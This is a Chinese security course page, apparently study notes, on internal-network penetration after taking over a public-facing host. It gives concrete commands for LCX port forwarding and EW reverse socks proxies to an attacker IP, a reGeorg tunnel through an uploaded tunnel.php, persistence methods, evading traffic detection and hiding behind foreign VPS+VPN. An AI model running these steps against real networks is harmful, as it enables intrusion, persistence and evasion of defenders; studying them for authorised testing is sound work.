@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>67 · 内网渗透 | tongui 的安全笔记</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="内网渗透 ⭐ 一句话总结:拿下公网主机后先做信息收集,再提权和权限维持,最后通过 Socks 代理&#x2F;端口转发&#x2F;隧道打通”不出网”的内网主机,扩大战果。  学习目标 理解内网&#x2F;外网&#x2F;局域网概念 掌握拿下主机后的信息收集项 掌握权限维持手段 会用端口转发、reGeorg、EW 做内网渗透  一、概念 外网主机:有公网 IP、可出网。 内网主机:无公网 IP、不可">
+<meta property="og:type" content="website">
+<meta property="og:title" content="67 · 内网渗透">
+<meta property="og:url" content="https://tongui66.github.io/course-notes/chapter4-intranet/67-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="tongui 的安全笔记">
+<meta property="og:description" content="内网渗透 ⭐ 一句话总结:拿下公网主机后先做信息收集,再提权和权限维持,最后通过 Socks 代理&#x2F;端口转发&#x2F;隧道打通”不出网”的内网主机,扩大战果。  学习目标 理解内网&#x2F;外网&#x2F;局域网概念 掌握拿下主机后的信息收集项 掌握权限维持手段 会用端口转发、reGeorg、EW 做内网渗透  一、概念 外网主机:有公网 IP、可出网。 内网主机:无公网 IP、不可">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-08T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-08T01:54:51.800Z">
+<meta property="article:author" content="tongui">
+<meta property="article:tag" content="Web安全, 渗透测试, CTF, SQL注入, XSS, 内网渗透, 应急响应, 安全笔记">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="tongui 的安全笔记" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a href="/" id="logo" class="nav-logo">tongui 的安全笔记</a>
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/security-notes/">安全笔记</a>
+        
+          <a class="main-nav-link" href="/course-notes/">课程</a>
+        
+          <a class="main-nav-link" href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">CTF题解</a>
+        
+          <a class="main-nav-link" href="/tools">工具</a>
+        
+          <a class="main-nav-link" href="/projects">项目</a>
+        
+          <a class="main-nav-link nav-resume" href="/resume">简历</a>
+        
+          <a class="main-nav-link" href="/about">关于我</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          
+            <a class="nav-icon" target="_blank" rel="noopener" href="https://github.com/tongui66"><span class="fa fa-github"></span></a>
+          
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://tongui66.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="page-" class="h-entry article article-type-page" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/course-notes/chapter4-intranet/67-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html" class="article-date">
+  <time class="dt-published" datetime="2026-08-08T02:00:00.000Z" itemprop="datePublished">2026-08-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      67 · 内网渗透
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><blockquote>
+<p>⭐ <strong>一句话总结</strong>:拿下公网主机后先做信息收集,再提权和权限维持,最后通过 Socks 代理&#x2F;端口转发&#x2F;隧道打通”不出网”的内网主机,扩大战果。</p>
+</blockquote>
+<h2 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h2><ul>
+<li>理解内网&#x2F;外网&#x2F;局域网概念</li>
+<li>掌握拿下主机后的信息收集项</li>
+<li>掌握权限维持手段</li>
+<li>会用端口转发、reGeorg、EW 做内网渗透</li>
+</ul>
+<h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><ul>
+<li><strong>外网主机</strong>:有公网 IP、可出网。</li>
+<li><strong>内网主机</strong>:无公网 IP、不可出网,只能内网访问(数据库&#x2F;文件&#x2F;后台系统等)。</li>
+<li>局域网 &#x3D; 内网环境;出网与否是相对概念。</li>
+<li>不出网主机 → 用 <strong>Socks 代理&#x2F;端口转发&#x2F;隧道</strong>打通数据。</li>
+</ul>
+<h2 id="二、拿下主机后的流程"><a href="#二、拿下主机后的流程" class="headerlink" title="二、拿下主机后的流程"></a>二、拿下主机后的流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">信息收集 → 提权 → 权限维持 → 内网探测 → 代理/隧道 → 横向渗透</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、信息收集项"><a href="#三、信息收集项" class="headerlink" title="三、信息收集项"></a>三、信息收集项</h2><table>
+<thead>
+<tr>
+<th>项</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>系统版本&#x2F;补丁</td>
+<td>systeminfo、uname -a;找 EXP</td>
+</tr>
+<tr>
+<td>Shell 权限</td>
+<td>普通权限→提权</td>
+</tr>
+<tr>
+<td>用户&#x2F;用户组</td>
+<td>找管理员组用户,为后续收集密码&#x2F;登录做准备</td>
+</tr>
+<tr>
+<td>杀毒软件</td>
+<td>判断是否需要免杀(服务器一般少装)</td>
+</tr>
+<tr>
+<td>防火墙</td>
+<td>进站&#x2F;出站规则,决定端口能否使用</td>
+</tr>
+<tr>
+<td>端口&#x2F;服务</td>
+<td>判断应用,配合提权</td>
+</tr>
+<tr>
+<td>域信息</td>
+<td>工作组&#x2F;域组织形式</td>
+</tr>
+</tbody></table>
+<h2 id="四、权限维持"><a href="#四、权限维持" class="headerlink" title="四、权限维持"></a>四、权限维持</h2><ul>
+<li>创建用户(容易被巡检发现)</li>
+<li>利用现有用户(收集管理员密码,mimikatz)</li>
+<li>计划任务(定时下载运行木马)</li>
+<li>服务(SC create)</li>
+<li>启动项&#x2F;注册表</li>
+<li>映像劫持(屏蔽杀软)</li>
+<li>篡改常用工具文件(如 ps)</li>
+</ul>
+<h2 id="五、内网渗透工具分类"><a href="#五、内网渗透工具分类" class="headerlink" title="五、内网渗透工具分类"></a>五、内网渗透工具分类</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>工具</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>端口转发</td>
+<td>NC、LCX、netsh</td>
+<td>把内网端口数据转出来</td>
+</tr>
+<tr>
+<td>HTTP 隧道</td>
+<td>reGeorg + ProxyFire</td>
+<td>利用已上线主机的 Web 建立隧道</td>
+</tr>
+<tr>
+<td>Socks 代理</td>
+<td>EW(earthworm)、SocksCap、Proxychains</td>
+<td>打通不出网主机</td>
+</tr>
+</tbody></table>
+<h2 id="六、端口转发-LCX"><a href="#六、端口转发-LCX" class="headerlink" title="六、端口转发(LCX)"></a>六、端口转发(LCX)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机监听</span></span><br><span class="line">lcx.exe -listen 2222</span><br><span class="line"><span class="comment"># 目标主机把3389转发到攻击机2222</span></span><br><span class="line">lcx.exe -slave 攻击机IP 2222 127.0.0.1 3389</span><br><span class="line"><span class="comment"># 攻击机再转到本地4444,用远程桌面连接127.0.0.1:4444</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>转出什么端口的数据,就用对应工具接收(3389→远程桌面)。</li>
+</ul>
+<h2 id="七、reGeorg-HTTP-隧道"><a href="#七、reGeorg-HTTP-隧道" class="headerlink" title="七、reGeorg HTTP 隧道"></a>七、reGeorg HTTP 隧道</h2><ol>
+<li>上传 <code>tunnel.php</code> 到已上线主机 Web 目录。</li>
+<li>攻击机运行 <code>reGeorg.py -p 999 -u http://目标/tunnel.php</code>,监听本地 999。</li>
+<li>用 <strong>ProxyFire</strong> 把本机程序(浏览器)代理到 127.0.0.1:999(Socks5)。</li>
+<li>浏览器访问内网 IP,数据经 HTTP 隧道转发。</li>
+</ol>
+<h2 id="八、EW-earthworm-代理"><a href="#八、EW-earthworm-代理" class="headerlink" title="八、EW(earthworm)代理"></a>八、EW(earthworm)代理</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标主机(正向监听1080)</span></span><br><span class="line">ew.exe -s ssocksd -l 1080</span><br><span class="line"><span class="comment"># 攻击机 SocksCap 添加浏览器,代理连接 目标IP:1080</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机监听</span></span><br><span class="line">ew.exe -s rssocks -l 1080 -e 8888</span><br><span class="line"><span class="comment"># 目标主机反向连接攻击机</span></span><br><span class="line">ew.exe -s rssocks -d 攻击机IP -e 8888</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>配合 SocksCap 指定某个程序走代理。</li>
+</ul>
+<h2 id="九、隐藏自己"><a href="#九、隐藏自己" class="headerlink" title="九、隐藏自己"></a>九、隐藏自己</h2><ul>
+<li>使用国外 VPS + VPN 中转,蓝队溯源难追到本人。</li>
+</ul>
+<h2 id="十、流量特征"><a href="#十、流量特征" class="headerlink" title="十、流量特征"></a>十、流量特征</h2><ul>
+<li>菜刀:base64 特征</li>
+<li>冰蝎:AES+base64、密钥协商</li>
+<li>蚁剑:UA&#x3D;antSword</li>
+<li>哥斯拉:AES 加密</li>
+<li>EW&#x2F;reGeorg 等也有固定流量特征;使用前需修改防检测。</li>
+</ul>
+<h2 id="十一、重点速记"><a href="#十一、重点速记" class="headerlink" title="十一、重点速记"></a>十一、重点速记</h2><ul>
+<li>外网可出网,内网不出网;代理解决不出网</li>
+<li>流程:信息收集→提权→权限维持→内网渗透</li>
+<li>权限维持:用户&#x2F;计划任务&#x2F;服务&#x2F;启动项&#x2F;映像劫持</li>
+<li>端口转发:LCX&#x2F;netsh;隧道:reGeorg;代理:EW&#x2F;SocksCap</li>
+<li>隐藏身份:VPS+VPN</li>
+<li>工具流量特征要改</li>
+</ul>
+<h2 id="自测题"><a href="#自测题" class="headerlink" title="自测题"></a>自测题</h2><ol>
+<li>内网主机和外网主机怎么区分?</li>
+<li>不出网主机怎么访问?</li>
+<li>拿下主机后先做什么?</li>
+<li>信息收集要收集哪些项?</li>
+<li>权限维持有哪些手段?</li>
+<li>LCX 端口转发的思路?</li>
+<li>reGeorg 隧道需要哪些步骤?</li>
+<li>EW 正向和反向代理区别?</li>
+<li>为什么用 VPS+VPN?</li>
+<li>四大 WebShell 工具的流量特征?</li>
+</ol>
+<details><summary>参考答案</summary>
+1. 外网有公网IP可出网,内网无公网IP不可出网。<br>
+2. 通过代理/端口转发/隧道。<br>
+3. 信息收集。<br>
+4. 系统版本补丁、权限、用户组、杀软、防火墙、端口服务、域信息。<br>
+5. 用户、计划任务、服务、启动项、映像劫持等。<br>
+6. 目标主机slave转发端口到攻击机监听端口,攻击机再转本地用对应工具连接。<br>
+7. 上传tunnel.php→运行reGeorg.py监听→ProxyFire配Socks5代理浏览器。<br>
+8. 正向由攻击机主动连,反向由目标机主动连攻击机。<br>
+9. 隐藏真实IP,防溯源反制。<br>
+10. 菜刀base64、冰蝎AES+base64、蚁剑UA特征、哥斯拉AES。<br>
+</details>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tongui66.github.io/course-notes/chapter4-intranet/67-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html" data-id="cuidS_K_B9jU5vxJTTNNgqCxW" data-title="67 · 内网渗透" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">上传</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 10px;">代理</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a> <a href="/tags/%E5%BA%94%E6%80%A5/" style="font-size: 10px;">应急</a> <a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 10px;">护网</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">报告</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%9F%A5%E6%9D%80/" style="font-size: 10px;">查杀</a> <a href="/tags/%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">流程</a> <a href="/tags/%E7%AD%89%E4%BF%9D/" style="font-size: 10px;">等保</a> <a href="/tags/%E9%9A%A7%E9%81%93/" style="font-size: 10px;">隧道</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a> <a href="/tags/%E9%A2%98%E5%BA%93/" style="font-size: 10px;">题库</a> <a href="/tags/%E9%AB%98%E9%A2%91/" style="font-size: 10px;">高频</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/security-notes/interview-100/">面试高频问答 100 题</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/incident-response/">应急响应速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/intranet-domain/">内网渗透与域渗透速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/pentest-checklist/">渗透测试全流程速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/payload-handbook/">Web 漏洞速查与 Payload 手册</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 tongui<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/security-notes/" class="mobile-nav-link">安全笔记</a>
+  
+    <a href="/course-notes/" class="mobile-nav-link">课程</a>
+  
+    <a href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95" class="mobile-nav-link">CTF题解</a>
+  
+    <a href="/tools" class="mobile-nav-link">工具</a>
+  
+    <a href="/projects" class="mobile-nav-link">项目</a>
+  
+    <a href="/resume" class="mobile-nav-link">简历</a>
+  
+    <a href="/about" class="mobile-nav-link">关于我</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script>
+  (function(){
+    var path = location.pathname.replace(/\/+$/, '') || '/';
+    var links = document.querySelectorAll('#main-nav .main-nav-link');
+    var best = null, bestLen = -1;
+    for (var i = 0; i < links.length; i++){
+      var href = links[i].getAttribute('href') || '';
+      href = href.replace(/\/+$/, '') || '/';
+      var hit = (href === '/' ? path === '/' : (path === href || path.indexOf(href + '/') === 0));
+      if (hit && href.length > bestLen){
+        bestLen = href.length;
+        best = links[i];
+      }
+    }
+    if (best){
+      best.classList.add('current');
+    }
+  })();
+</script>
+
+
+
+
+
+
+  </div>
+</body>
+</html>
